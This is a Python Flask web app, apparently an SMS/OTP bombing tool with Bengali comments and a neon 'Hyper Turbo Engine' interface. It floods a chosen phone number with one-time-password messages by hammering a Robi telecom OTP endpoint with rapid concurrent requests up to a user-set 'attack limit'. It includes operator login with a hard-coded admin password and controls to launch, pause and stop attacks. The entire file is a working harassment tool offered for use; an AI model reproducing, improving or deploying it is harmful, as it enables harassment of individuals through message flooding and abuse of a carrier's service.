import os, asyncio, aiohttp, sqlite3, time, random
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, session, redirect
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- [CONFIG] ----------
ROBI_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
# রেন্ডারে আপনার লিঙ্কে নিজেকে পিং করার সিস্টেম (Self-Wakeup)
APP_URL = "https://rk-bomb.onrender.com"

# ---------- [DATABASE] ----------
def init_db():
    conn = sqlite3.connect('rk_async_v4.db')
    conn.execute('CREATE TABLE IF NOT EXISTS users (u TEXT UNIQUE, p TEXT)')
    try: conn.execute('INSERT INTO users VALUES (?,?)', ("admin", generate_password_hash("JaNiNaTo-330")))
    except: pass
    conn.commit()
    conn.close()

init_db()

# ---------- [GLOBAL SESSION MANAGER] ----------
active_missions = {}

async def send_otp_async(session, phone):
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    target = phone if phone.startswith("88") else f"88{phone}"
    try:
        async with session.post(ROBI_URL, json={"msisdn": target}, headers=headers, timeout=5) as resp:
            return resp.status == 200
    except: return False

async def worker_task(u, phone, limit):
    key = f"{u}_{phone}"
    start_time = datetime.now()
    
    async with aiohttp.ClientSession() as session:
        while key in active_missions:
            m = active_missions[key]
            if m['total'] >= limit or m['status'] == 'Terminated': break
            
            if m['status'] == 'Running':
                # টাইম ও প্রগ্রেস আপডেট
                elapsed = datetime.now() - start_time
                active_missions[key]['run_time'] = str(elapsed).split('.')[0]
                
                # হাই স্পিড অ্যাসিনক্রোনাস রিকোয়েস্ট
                tasks = [send_otp_async(session, phone) for _ in range(3)] # একবারে ৩টি
                results = await asyncio.gather(*tasks)
                
                for res in results:
                    active_missions[key]['total'] += 1
                    if res: active_missions[key]['success'] += 1
                
                # প্রগ্রেস পার্সেন্টেজ
                active_missions[key]['progress'] = min(100, round((active_missions[key]['total'] / limit) * 100))
                await asyncio.sleep(0.1) # সুপার ফাস্ট গ্যাপ
            else:
                await asyncio.sleep(1) # Pause অবস্থায় ওয়েট

    if key in active_missions: del active_missions[key]

# ---------- [UI DESIGN] ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-V24 HYPER MONITOR</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #050505; --red: #ff3366; --yellow: #ffcc00; }
        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; }
        .container { max-width: 450px; margin: auto; padding: 20px; }
        .card { background: #0d0d0d; border-radius: 20px; padding: 25px; border: 1px solid #1a1a1a; box-shadow: 0 0 20px rgba(0,255,204,0.1); }
        h2 { font-family: 'Orbitron'; color: var(--neon); text-align: center; margin-bottom: 25px; font-size: 18px; }
        
        input { width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #222; color: var(--neon); border-radius: 12px; outline: none; box-sizing: border-box; }
        .btn-launch { width: 100%; padding: 18px; background: var(--neon); border: none; border-radius: 12px; font-family: 'Orbitron'; font-weight: bold; cursor: pointer; color: #000; margin-top: 10px; }

        .mission-box { background: #000; border: 1px solid #222; border-radius: 15px; padding: 15px; margin-top: 20px; border-left: 4px solid var(--neon); }
        .stat-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 10px 0; }
        .stat-item { background: #080808; padding: 8px; border-radius: 8px; text-align: center; font-size: 13px; }
        .label { color: #555; display: block; font-size: 10px; }
        
        .progress-container { height: 10px; background: #111; border-radius: 5px; margin: 15px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #00d2ff, var(--neon)); width: 0%; transition: 0.4s; }
        
        .ctrl-btns { display: flex; gap: 10px; margin-top: 10px; }
        .btn-ctrl { flex: 1; padding: 10px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 11px; font-family: 'Orbitron'; }
        .bg-pause { background: var(--yellow); color: #000; }
        .bg-stop { background: var(--red); color: #fff; }
        .bg-resume { background: #00d2ff; color: #000; }
    </style>
</head>
<body>
    <div class="container">
        [CONTENT]
    </div>
    <script>
        function sync() {
            let area = document.getElementById('live-area');
            if(!area) return;
            fetch('/api/status').then(r => r.json()).then(data => {
                let html = '';
                for(let k in data) {
                    let s = data[k];
                    html += `
                    <div class="mission-box">
                        <div style="display:flex; justify-content:space-between; font-size:12px;">
                            <span style="color:var(--neon)">🎯 ${s.phone}</span>
                            <span style="color:${s.status==='Running'?'#00ffcc':'#ffcc00'}">● ${s.status}</span>
                        </div>
                        <div class="stat-row">
                            <div class="stat-item"><span class="label">SUCCESS</span><b>${s.success}</b></div>
                            <div class="stat-item"><span class="label">RUN TIME</span><b>${s.run_time}</b></div>
                        </div>
                        <div class="progress-container"><div class="progress-fill" style="width:${s.progress}%"></div></div>
                        <div style="text-align:right; font-size:10px; color:#555;">Progress: ${s.progress}%</div>
                        <div class="ctrl-btns">
                            <button class="btn-ctrl ${s.status==='Running'?'bg-pause':'bg-resume'}" onclick="location.href='/api/control?num=${s.phone}&act=${s.status==='Running'?'Paused':'Running'}'">
                                ${s.status==='Running'?'PAUSE':'RESUME'}
                            </button>
                            <button class="btn-ctrl bg-stop" onclick="location.href='/api/stop?num=${s.phone}'">STOP</button>
                        </div>
                    </div>`;
                }
                area.innerHTML = html;
            });
        }
        setInterval(sync, 1000);
    </script>
</body>
</html>
'''

# ---------- [ROUTES] ----------

@app.route('/')
def index():
    if 'u' not in session: return redirect('/login')
    content = '''
    <div class="card">
        <h2>⚡ HYPER TURBO ENGINE</h2>
        <form action="/api/start">
            <input name="num" type="tel" placeholder="Target Phone Number" required>
            <input name="amt" type="number" placeholder="Total Attack Limit" required>
            <button class="btn-launch">LAUNCH ATTACK</button>
        </form>
    </div>
    <div id="live-area"></div>
    '''
    return render_template_string(LAYOUT.replace('[CONTENT]', content))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        conn = sqlite3.connect('rk_async_v4.db'); conn.row_factory = sqlite3.Row
        user = conn.execute('SELECT * FROM users WHERE u=?', (u,)).fetchone(); conn.close()
        if user and check_password_hash(user['p'], p):
            session['u'] = u; return redirect('/')
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="card"><h2>OPERATOR LOGIN</h2><form method="POST"><input name="u" placeholder="ID"><input name="p" type="password" placeholder="Key"><button class="btn-launch">LOGIN</button></form></div>'))

@app.route('/api/start')
def api_start():
    u, num, amt = session.get('u'), request.args.get('num'), int(request.args.get('amt') or 0)
    if u and num:
        key = f"{u}_{num}"
        active_missions[key] = {'phone': num, 'success': 0, 'total': 0, 'limit': amt, 'status': 'Running', 'run_time': '0:00:00', 'progress': 0}
        # অ্যাসিনক্রোনাস কাজ শুরু করা
        threading.Thread(target=lambda: asyncio.run(worker_task(u, num, amt)), daemon=True).start()
    return redirect('/')

@app.route('/api/status')
def api_status():
    return jsonify({k: v for k, v in active_missions.items() if k.startswith(session.get('u',''))})

@app.route('/api/control')
def api_control():
    key = f"{session.get('u')}_{request.args.get('num')}"
    if key in active_missions: active_missions[key]['status'] = request.args.get('act')
    return redirect('/')

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('u')}_{request.args.get('num')}"
    if key in active_missions: active_missions[key]['status'] = 'Terminated'
    return redirect('/')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
